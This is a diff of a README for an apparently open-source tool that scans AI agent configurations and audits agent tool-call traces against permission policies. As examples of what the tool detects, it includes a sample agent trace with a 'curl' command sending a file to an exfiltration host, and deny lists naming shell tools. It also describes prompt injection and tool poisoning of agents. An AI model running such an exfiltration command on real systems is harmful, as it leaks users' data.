@@ -2,166 +2,568 @@
 
 **Open-source AI Agent Security Scanner — "OWASP ZAP for AI Agents"**
 
+[![CI](https://github.com/arpitha-dhanapathi/pluto-aguard/actions/workflows/ci.yml/badge.svg)](https://github.com/arpitha-dhanapathi/pluto-aguard/actions/workflows/ci.yml)
 [![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
 [![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
+[![PyPI](https://img.shields.io/pypi/v/pluto-aguard)](https://pypi.org/project/pluto-aguard/)
 
 ---
 
-Guardrails tell an LLM what not to say. **Pluto AgentGuard watches what the agent actually does.**
+## The Problem
 
-Existing tools (Azure AI Content Safety, NeMo Guardrails, Guardrails AI) protect LLM inputs and outputs. But modern AI agents don't just generate text — they call tools, access databases, write files, and chain actions across systems via MCP and other protocols. **Nobody is auditing that behavior.**
+Guardrails (Azure AI Content Safety, NeMo, Guardrails AI) protect what LLMs **say**. But modern AI agents don't just generate text — they call tools, query databases, write files, and chain actions across systems via MCP. **Nobody is watching what they actually do.**
 
-Pluto AgentGuard fills the gap *above* guardrails:
+```
+┌──────────────────────────────────────────────────────────────────┐
+│                     EXISTING GUARDRAILS                          │
+│         "Is this prompt safe?" / "Is this output toxic?"         │
+│                   ✅ Solved by Foundry, NeMo, etc.               │
+├──────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│                     ⬇️  GAP ⬇️                                   │
+│                                                                  │
+├──────────────────────────────────────────────────────────────────┤
+│                   PLUTO AGENTGUARD                               │
+│     "What tools did the agent call? Was it authorized?           │
+│      Did it exceed its permissions? What if we restrict it?"     │
+│                   🔴 This is what we solve.                      │
+└──────────────────────────────────────────────────────────────────┘
+```
 
-- 🔍 **Scan** MCP server configs for vulnerabilities (OWASP MCP Top 10)
-- 📡 **Monitor** agent behavior across turns — tool calls, data access, permission usage
-- 🚨 **Detect** permission drift — agents exceeding their declared capabilities
-- 🔮 **Simulate** policy changes — "What if I restrict this tool?" → see risk score change instantly
+## What It Does
 
-## Quick Start
+Pluto AgentGuard is a **CLI tool** that you run against your AI agent project to find security issues, monitor behavior, and simulate policy changes.
+
+```mermaid
+graph LR
+    A[Your Agent Project] -->|aguard scan| B[🔍 Static Scanner]
+    A -->|aguard monitor| C[📡 Behavioral Monitor]
+    A -->|aguard whatif| D[🔮 Policy Simulator]
+
+    B --> E[MCP Config Vulnerabilities]
+    B --> F[Hardcoded Secrets]
+    B --> G[Over-Permissioned Agents]
+
+    C --> H[Unauthorized Tool Calls]
+    C --> I[Permission Drift]
+    C --> J[Data Access Violations]
+
+    D --> K[Risk Score Before/After]
+    D --> L[Policy Recommendations]
+
+    E & F & G & H & I & J & K & L --> M[📊 Report<br/>HTML / JSON / Terminal]
+```
+
+### Three Commands, Three Capabilities
+
+| Command | What It Does | Input | Output |
+|---|---|---|---|
+| `aguard scan` | Finds security vulnerabilities in your agent configuration files | Agent project directory | Risk score + findings (OWASP MCP Top 10 mapped) |
+| `aguard monitor` | Replays agent traces and flags policy violations | OpenTelemetry trace file (JSONL) + policy file (YAML) | Violation report with drift detection |
+| `aguard whatif` | Simulates "what if I apply this policy?" and shows risk delta | Agent config file (YAML) | Before/after risk scores + recommendations |
+
+---
+
+## Prerequisites
+
+| Requirement | Version | Check |
+|---|---|---|
+| Python | 3.10 or higher | `python --version` |
+| pip | Any recent version | `pip --version` |
+| OS | Windows, macOS, or Linux | Any |
+
+**No cloud accounts, API keys, or external services required.** AgentGuard runs entirely locally.
+
+## Installation
+
+### From PyPI (recommended)
 
 ```bash
 pip install pluto-aguard
-
-# Scan an agent project for security issues
-aguard scan ./my-agent-project/
-
-# Monitor agent behavior in real-time
-aguard monitor --trace-file traces.jsonl
-
-# Simulate policy changes
-aguard whatif --config agent-config.yaml
 ```
 
-## Features
+### From source (development)
 
-### `aguard scan` — Static Security Analysis
+```bash
+git clone https://github.com/arpitha-dhanapathi/pluto-aguard.git
+cd pluto-aguard
+python -m venv .venv
 
-Scans your agent project for vulnerabilities mapped to the [OWASP MCP Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/):
+# Activate virtual environment
+source .venv/bin/activate      # macOS / Linux
+.venv\Scripts\activate         # Windows
+
+pip install -e ".[dev]"
+```
+
+### Verify installation
+
+```bash
+aguard --version
+# pluto-aguard, version 0.1.0
+```
+
+---
+
+## Quick Start: Try It in 60 Seconds
+
+The repo includes example files so you can test immediately after install:
+
+```bash
+# Clone the repo (for examples)
+git clone https://github.com/arpitha-dhanapathi/pluto-aguard.git
+cd pluto-aguard
+
+# 1. SCAN — find vulnerabilities in the intentionally insecure example
+aguard scan ./examples/
+
+# 2. MONITOR — replay agent traces and detect policy violations
+aguard monitor --trace-file ./examples/sample-traces.jsonl --policy ./examples/agent-policy.yaml
+
+# 3. WHATIF — simulate policy changes on the insecure config
+aguard whatif --config ./examples/insecure-agent-config.yaml
+```
+
+---
+
+## Features in Detail
+
+### 1. `aguard scan` — Static Security Analysis
+
+Scans your project directory for MCP configuration files, agent configs, and source code. Detects vulnerabilities mapped to the [OWASP MCP Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/).
+
+**What it scans for:**
+
+```mermaid
+graph TD
+    SCAN[aguard scan ./project/] --> A[MCP Config Files]
+    SCAN --> B[Agent Config Files]
+    SCAN --> C[Source & Env Files]
+
+    A --> A1[🔴 Wildcard permissions — OWASP-MCP-03]
+    A --> A2[🔴 Missing auth on remote servers — OWASP-MCP-01]
+    A --> A3[🔴 Tool poisoning in descriptions — OWASP-MCP-02]
+    A --> A4[🟠 HTTP transport, no TLS — OWASP-MCP-06]
+    A --> A5[🟠 Dangerous tools without HITL — OWASP-MCP-04]
+    A --> A6[🟡 Static long-lived tokens — OWASP-MCP-05]
+
+    B --> B1[🟠 No declared permissions]
+    B --> B2[🟠 Unrestricted data access]
+    B --> B3[🟡 Missing timeout/rate limits]
+
+    C --> C1[🟠 Hardcoded API keys — OWASP-MCP-07]
+    C --> C2[🟠 Connection strings with credentials]
+    C --> C3[🟠 Private keys in config]
+```
+
+**File patterns scanned:**
+
+| File Pattern | What's Checked |
+|---|---|
+| `mcp.json`, `mcp.yaml`, `.mcp.json` | MCP server configs (permissions, transport, auth, tools) |
+| `agent-config.yaml`, `agent.yaml` | Agent permissions, HITL gates, data access rules, limits |
+| `*.env`, `*.json`, `*.yaml`, `*.py`, `*.js`, `*.ts` | Hardcoded secrets (10+ patterns: AWS, OpenAI, GitHub, Slack, Azure, etc.) |
+
+**Example output:**
 
 ```
 $ aguard scan ./my-agent-project/
 
-🔍 Scanning MCP configurations...
-  ⚠️  CRITICAL: mcp-server-postgres has wildcard permissions (OWASP-MCP-03)
-  ⚠️  HIGH: API key hardcoded in .env (OWASP-MCP-07)
-  ⚠️  MEDIUM: mcp-server-github uses long-lived token (OWASP-MCP-05)
-  ✅ mcp-server-slack: permissions scoped correctly
+🔍 Scanning /home/user/my-agent-project...
 
-📊 Risk Score: 72/100 (High)
-📄 Full report: ./aguard-report.html
+  Scanning MCP configurations and secrets...
+  Scanning agent permission configurations...
+  🔴 CRITICAL: Wildcard permissions on MCP server 'postgres-server' (OWASP-MCP-03)
+     📄 mcp.json:5
+  🔴 CRITICAL: No authentication on remote MCP server 'api-gateway' (OWASP-MCP-01)
+     📄 mcp.json:12
+  🟠 HIGH: Hardcoded OpenAI Key detected (OWASP-MCP-07)
+     📄 .env:3
+     Evidence: sk-p****XYZ1
+  🟠 HIGH: Dangerous tools without human approval on 'data-agent' (OWASP-MCP-04)
+     📄 agent-config.yaml
+  🟡 MEDIUM: No timeout or rate limits on agent 'data-agent'
+     📄 agent-config.yaml
+
+  📊 Risk Score: 72/100 ████████████████████████████████████░░░░░░░░░░░░░░░
+  📋 Findings: 2 critical · 2 high · 1 medium
+  📂 Scanned 47 files in 38ms
 ```
 
-### `aguard monitor` — Runtime Behavioral Audit
+**Output formats:**
 
-Monitors agent sessions and detects unauthorized behavior:
-
-```
-$ aguard monitor --trace-file traces.jsonl
-
-📡 Monitoring agent session...
-  Turn 1: User asked about Q2 revenue
-  Turn 2: Agent called tool: sql_query("SELECT * FROM financials")
-  Turn 3: ⚠️ DRIFT: Agent called tool: file_write("/tmp/export.csv")
-          → Agent has READ permission only. Write action unauthorized.
-  Turn 4: Agent returned response with PII (SSN detected)
-
-🚨 2 policy violations detected in 4 turns
+```bash
+aguard scan ./project/                       # Terminal (default)
+aguard scan ./project/ --format json         # JSON (for CI pipelines)
+aguard scan ./project/ --format html -o report.html  # Interactive HTML report
 ```
 
-### `aguard whatif` — Policy Impact Simulator
+---
 
-Simulate the effect of security policy changes *before* applying them:
+### 2. `aguard monitor` — Runtime Behavioral Audit
+
+Replays recorded agent traces and checks every action against a declared policy. Detects when agents exceed their permissions.
+
+**How it works:**
+
+```mermaid
+sequenceDiagram
+    participant Traces as Agent Traces<br/>(JSONL file)
+    participant Monitor as aguard monitor
+    participant Policy as Agent Policy<br/>(YAML file)
+    participant Report as Violation Report
+
+    Traces->>Monitor: Turn 1: sql_query("SELECT * FROM users")
+    Monitor->>Policy: Is sql_query allowed?
+    Policy-->>Monitor: ✅ Allowed (read)
+    Monitor->>Report: ✅ No violation
+
+    Traces->>Monitor: Turn 2: file_write("/tmp/data.csv")
+    Monitor->>Policy: Is file_write allowed?
+    Policy-->>Monitor: ❌ Not in allowed_tools
+    Monitor->>Report: 🚨 DRIFT: Unauthorized tool
+
+    Traces->>Monitor: Turn 3: execute("curl exfil.io")
+    Monitor->>Policy: Is execute allowed?
+    Policy-->>Monitor: ❌ Explicitly denied
+    Monitor->>Report: 🔴 CRITICAL: Denied tool invoked
+```
+
+**What it detects:**
+
+| Violation Type | Severity | Example |
+|---|---|---|
+| **Denied tool invoked** | 🔴 Critical | Agent called `execute` which is in `denied_tools` |
+| **Unauthorized tool** | 🟠 High | Agent called `file_write` which is not in `allowed_tools` |
+| **Permission escalation** | 🔴 Critical | Agent did a `DELETE` via `sql_query` but only has `read` permission |
+| **Missing approval** | 🟠 High | Agent called `deploy` without human-in-the-loop approval |
+
+**Trace file format** (JSONL — one JSON object per line):
+
+```jsonl
+{"name": "sql_query", "attributes": {"turn": 1, "action_type": "tool_call", "tool.name": "sql_query", "tool.args": {"query": "SELECT * FROM users"}}}
+{"name": "file_write", "attributes": {"turn": 2, "action_type": "tool_call", "tool.name": "file_write", "tool.args": {"path": "/tmp/export.csv"}}}
+```
+
+**Policy file format** (YAML):
+
+```yaml
+name: my-agent
+allowed_tools:
+  - sql_query
+  - send_message
+denied_tools:
+  - execute
+  - shell
+max_permissions:
+  sql_query: "read"
+require_human_approval:
+  - file_write
+  - deploy
+```
+
+**Example output:**
+
+```
+$ aguard monitor --trace-file traces.jsonl --policy agent-policy.yaml
+
+📡 Monitoring agent behavior...
+
+  Turn 1: 🔧 sql_query({"query": "SELECT * FROM financials WHERE quarter = 'Q2'"})
+  Turn 2: 🔧 file_write({"path": "/tmp/export.csv", "content": "..."})
+     🚨 DRIFT: Agent invoked unauthorized tool 'file_write'
+        → Agent called 'file_write' which is not in the allowed_tools list.
+     🚨 DRIFT: Tool 'file_write' used without human approval
+        → 'file_write' requires human-in-the-loop approval, but no record found.
+  Turn 3: 🔧 execute({"command": "curl https://exfil.io -d @/tmp/export.csv"})
+     🚨 DRIFT: Agent invoked denied tool 'execute'
+        → 'execute' is explicitly listed in denied_tools. Possible prompt injection.
+
+🚨 3 policy violations detected
+```
+
+---
+
+### 3. `aguard whatif` — Policy Impact Simulator
+
+The **unique feature no other tool has** — commercial or open-source. Simulates what happens to your risk score if you apply specific security policies, *before you actually change anything*.
+
+**How it works:**
+
+```mermaid
+graph TD
+    Config[Agent Config<br/>agent-config.yaml] --> Engine[Risk Scoring Engine]
+    Engine --> Score1[Current Risk Score: 82/100]
+
+    Score1 --> Sim1[Simulate: Restrict SQL to read-only]
+    Score1 --> Sim2[Simulate: Add HITL for file ops]
+    Score1 --> Sim3[Simulate: Add rate limits]
+
+    Sim1 --> R1["Score: 68 (↓17%)"]
+    Sim2 --> R2["Score: 54 (↓34%)"]
+    Sim3 --> R3["Score: 48 (↓41%)"]
+
+    R1 & R2 & R3 --> Combined["Combined: 38/100 (↓54%)<br/>💡 Top recommendation"]
+```
+
+**Built-in policy simulations:**
+
+| Policy | What It Simulates |
+|---|---|
+| `restrict-sql-readonly` | Lock SQL tools to `SELECT` only |
+| `add-hitl-file-ops` | Require human approval for file write/delete |
+| `ephemeral-tokens` | Switch from static API keys to short-lived tokens |
+| `add-rate-limits` | Add rate limit (100 calls/min) and timeout (5 min) |
+| `restrict-network-egress` | Allowlist outbound network destinations |
+| `add-tool-allowlist` | Switch from implicit-allow to explicit tool allowlist |
+| `sandbox-execution` | Run agent in sandboxed/isolated environment |
+
+**Example output:**
 
 ```
 $ aguard whatif --config agent-config.yaml
 
-Current Risk Score: 82/100
+🔮 What-If Policy Simulator
 
-Simulating policy changes:
-  ✅ "Restrict SQL tool to SELECT-only"     → Score: 68 (-17%)
-  ✅ "Add human-in-the-loop for file ops"   → Score: 54 (-34%)
-  ✅ "Rotate API key to ephemeral tokens"   → Score: 48 (-41%)
+  Agent config: agent-config.yaml
+  Current Risk Score: 100/100
 
-💡 Top recommendation: Apply all 3 → Risk drops to 38/100 (-54%)
+  Simulating policy changes:
+
+  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━┳━━━━━━━━┓
+  ┃ Policy                                            ┃ New Score ┃ Change ┃
+  ┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━╇━━━━━━━━┩
+  │  ✅ Restrict SQL tool to SELECT-only              │       68  │  ↓ 17% │
+  │  ✅ Add human-in-the-loop for file operations     │       54  │  ↓ 34% │
+  │  ✅ Add rate limits and timeout                   │       48  │  ↓ 41% │
+  └───────────────────────────────────────────────────┴───────────┴────────┘
+
+  Combined impact (all 3 effective policies):
+  💡 Risk drops from 82 → 38 (↓54%)
+  📌 Permission restrictions are the highest-impact changes. Implement these first.
 ```
 
-## Why Pluto AgentGuard?
+---
 
-| Capability | Content Safety / Guardrails | Cisco MCP Scanner | **Pluto AgentGuard** |
-|---|---|---|---|
-| Content filtering | ✅ | — | — (not the point) |
-| PII/DLP | ✅ | — | — (not the point) |
-| MCP config scanning | — | Basic | **Deep + OWASP mapped** |
-| Agent behavioral audit | — | — | **✅ Core feature** |
-| Permission drift detection | — | — | **✅ Core feature** |
-| What-If policy simulation | — | — | **✅ Unique** |
-| Framework agnostic | Vendor-specific | MCP only | **All frameworks** |
+## How It Fits Into Your Stack
 
-## Supported Frameworks
+AgentGuard sits **above** your existing guardrails — it doesn't replace them.
 
-- **MCP** (Model Context Protocol) servers and clients
-- **LangChain** / **LangGraph** agents
-- **CrewAI** multi-agent systems
-- **AutoGen** agents
-- **Azure AI Foundry** agents
-- **Custom agents** (via OpenTelemetry traces)
+```mermaid
+graph TB
+    subgraph "Your AI Agent Application"
+        User[User] --> Agent[AI Agent]
+        Agent --> LLM[LLM API]
+        Agent --> Tools[MCP Tools / APIs]
+        Agent --> Data[Databases / Files]
+    end
 
-## Architecture
+    subgraph "Layer 1: Content Guardrails — existing tools"
+        LLM -.->|prompt/response| CG[Azure Content Safety<br/>NeMo Guardrails<br/>Guardrails AI]
+    end
 
-```
-┌─────────────────────────────────────────────┐
-│                 aguard CLI                   │
-├─────────────┬──────────────┬────────────────┤
-│   Scanner   │   Monitor    │   Simulator    │
-│             │              │                │
-│ • MCP config│ • OTel trace │ • Risk scoring │
-│ • Secrets   │   ingestion  │ • Policy graph │
-│ • Perms     │ • Drift      │ • What-If      │
-│ • OWASP map │   detection  │   engine       │
-├─────────────┴──────────────┴────────────────┤
-│              Rules Engine                    │
-│         (YAML-based, extensible)             │
-├─────────────────────────────────────────────┤
-│           Report Generator                   │
-│        (HTML / JSON / SARIF)                 │
-└─────────────────────────────────────────────┘
+    subgraph "Layer 2: Agent Security — Pluto AgentGuard"
+        Tools -.->|tool calls| AG_MON[aguard monitor<br/>Behavioral audit]
+        Agent -.->|config files| AG_SCAN[aguard scan<br/>Static analysis]
+        Agent -.->|agent config| AG_SIM[aguard whatif<br/>Policy simulation]
+    end
+
+    style AG_MON fill:#dc2626,color:#fff
+    style AG_SCAN fill:#dc2626,color:#fff
+    style AG_SIM fill:#dc2626,color:#fff
+    style CG fill:#2563eb,color:#fff
 ```
 
-## Development
+---
+
+## Integration Guide
+
+### With an existing MCP project
+
+If you have MCP server configurations (`mcp.json`, `claude_desktop_config.json`, etc.):
 
 ```bash
-# Clone and install in development mode
-git clone https://github.com/arpitha-dhanapathi/pluto-aguard.git
-cd pluto-aguard
-python -m venv .venv
-.venv\Scripts\activate  # Windows
-pip install -e ".[dev]"
+# Point scan at your project root
+aguard scan /path/to/your/project/
 
-# Run tests
-pytest
-
-# Run linting
-ruff check src/
+# It will auto-discover mcp.json, .mcp.yaml, agent configs, .env files
 ```
+
+### With OpenTelemetry-instrumented agents
+
+If your agent emits OpenTelemetry spans:
+
+```bash
+# Export traces to JSONL
+# (most OTel exporters support JSONL via file exporter)
+
+# Run monitor against the trace file
+aguard monitor --trace-file ./traces.jsonl --policy ./my-policy.yaml
+```
+
+### With any agent framework
+
+Create a simple trace file from your agent's logs:
+
+```jsonl
+{"turn": 1, "action_type": "tool_call", "tool_name": "sql_query", "tool_args": {"query": "SELECT * FROM users"}}
+{"turn": 2, "action_type": "tool_call", "tool_name": "file_write", "tool_args": {"path": "/tmp/out.csv"}}
+```
+
+Then monitor:
+
+```bash
+aguard monitor --trace-file my-traces.jsonl --policy my-policy.yaml
+```
+
+### In CI/CD pipelines
+
+```yaml
+# .github/workflows/agent-security.yml
+- name: Agent Security Scan
+  run: |
+    pip install pluto-aguard
+    aguard scan . --format json -o aguard-results.json
+
+- name: Check risk score
+  run: |
+    python -c "
+    import json
+    r = json.load(open('aguard-results.json'))
+    score = r['risk_score']['overall']
+    print(f'Risk score: {score}')
+    assert score < 50, f'Risk score {score} exceeds threshold of 50'
+    "
+```
+
+---
+
+## Testing in Your Environment
+
+### Step 1: Verify with the included examples
+
+```bash
+# These should work immediately after install
+aguard scan ./examples/                    # Should find 3+ findings
+aguard monitor --trace-file ./examples/sample-traces.jsonl --policy ./examples/agent-policy.yaml  # Should find 5 violations
+aguard whatif --config ./examples/insecure-agent-config.yaml  # Should show risk score of 100
+```
+
+### Step 2: Scan your own project
+
+```bash
+# Point at any directory with agent configs
+aguard scan /path/to/your/agent-project/
+
+# What to expect:
+# - If you have mcp.json / .mcp.yaml files → MCP config findings
+# - If you have .env files → secret detection findings
+# - If you have agent-config.yaml files → permission findings
+# - If none of these exist → "No security issues found!"
+```
+
+### Step 3: Create a policy for your agent
+
+```yaml
+# my-policy.yaml
+name: my-agent
+allowed_tools:
+  - search
+  - summarize
+denied_tools:
+  - execute
+  - shell
+max_permissions:
+  search: "read"
+require_human_approval:
+  - file_write
+```
+
+### Step 4: Monitor your agent's behavior
+
+```bash
+# Record your agent's tool calls as JSONL (see format above)
+# Then run:
+aguard monitor --trace-file my-agent-traces.jsonl --policy my-policy.yaml
+```
+
+### What should be true for a healthy scan
+
+| ✅ Passing | ❌ Failing |
+|---|---|
+| No wildcard (`*`) permissions on MCP servers | Wildcard permissions on any server |
+| All remote MCP servers have authentication | Unauthenticated remote servers |
+| No hardcoded secrets in config files | API keys, tokens in source/config |
+| Dangerous tools require human approval | `execute`, `shell`, `file_write` without HITL |
+| Agent has timeout and rate limits | No resource constraints |
+| Tool descriptions are clean | Suspicious text in tool metadata (poisoning) |
+| Risk score < 50 | Risk score ≥ 50 |
+
+---
+
+## Project Structure
+
+```
+pluto-aguard/
+├── src/pluto_aguard/
+│   ├── cli.py                     # CLI entry point (aguard command)
+│   ├── models.py                  # Pydantic data models (Finding, RiskScore, etc.)
+│   ├── scanners/
+│   │   ├── mcp_scanner.py         # MCP config + secret scanner
+│   │   ├── permission_scanner.py  # Agent permission analyzer + risk scorer
+│   │   └── runner.py              # Scan orchestrator
+│   ├── monitor/
+│   │   └── runner.py              # Behavioral monitor + drift detector
+│   ├── simulator/
+│   │   └── runner.py              # What-If policy simulator
+│   ├── reports/
+│   │   └── html_report.py         # HTML report generator
+│   └── rules/
+│       └── owasp_mcp_top10.yaml   # OWASP MCP Top 10 rule definitions
+├── examples/
+│   ├── insecure-agent-config.yaml # Intentionally vulnerable (for testing)
+│   ├── secure-agent-config.yaml   # Best-practice example
+│   ├── agent-policy.yaml          # Example policy file
+│   └── sample-traces.jsonl        # Example agent traces
+├── tests/                         # 35 tests across all modules
+├── .github/workflows/
+│   ├── ci.yml                     # CI: pytest + ruff on every push
+│   └── publish.yml                # Auto-publish to PyPI on release
+├── pyproject.toml                 # Package configuration
+└── README.md
+```
+
+---
+
+## Why This Exists
+
+| Problem | Today's Landscape | AgentGuard's Answer |
+|---|---|---|
+| **Content safety** (toxic prompts/responses) | ✅ Solved by Azure Content Safety, NeMo, Guardrails AI | Not our scope — use those tools |
+| **What tools did the agent call?** | ❌ No tool audits this | `aguard monitor` |
+| **Did the agent exceed its permissions?** | ❌ No tool detects drift | `aguard monitor` with policy |
+| **Are my MCP configs secure?** | 🟡 Cisco scanner (basic) | `aguard scan` (deep, OWASP-mapped) |
+| **What if I restrict this permission?** | ❌ Nobody does this | `aguard whatif` (unique) |
+| **Are secrets in my agent configs?** | 🟡 Generic secret scanners exist | `aguard scan` (agent-aware context) |
+
+---
 
 ## Roadmap
 
 - [x] **v0.1** — MCP config scanner + secret detection + OWASP MCP Top 10 rules
-- [ ] **v0.2** — Runtime behavioral monitor with OpenTelemetry trace ingestion
-- [ ] **v0.3** — Permission drift detection engine
-- [ ] **v0.4** — What-If policy simulator with risk scoring
-- [ ] **v0.5** — HTML report generator with interactive visualizations
-- [ ] **v1.0** — Multi-framework support (LangChain, CrewAI, AutoGen, Foundry)
+- [x] **v0.2** — Runtime behavioral monitor with OpenTelemetry trace ingestion
+- [x] **v0.3** — Permission drift detection engine
+- [x] **v0.4** — What-If policy simulator with risk scoring
+- [x] **v0.5** — HTML report generator
+- [ ] **v1.0** — Multi-framework adapters (LangChain, CrewAI, AutoGen, Foundry)
+- [ ] **v1.1** — SARIF output for GitHub Advanced Security integration
+- [ ] **v1.2** — Live agent monitoring (real-time stdin mode)
+- [ ] **v1.3** — Custom rule authoring SDK
 
 ## Contributing
 
-Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for setup instructions and guidelines.
 
 ## License
 
 Apache License 2.0 — see [LICENSE](LICENSE) for details.
-
----
-
-*Built by [Arpitha Dhanapathi](https://github.com/arpitha-dhanapathi) — PM who builds.*
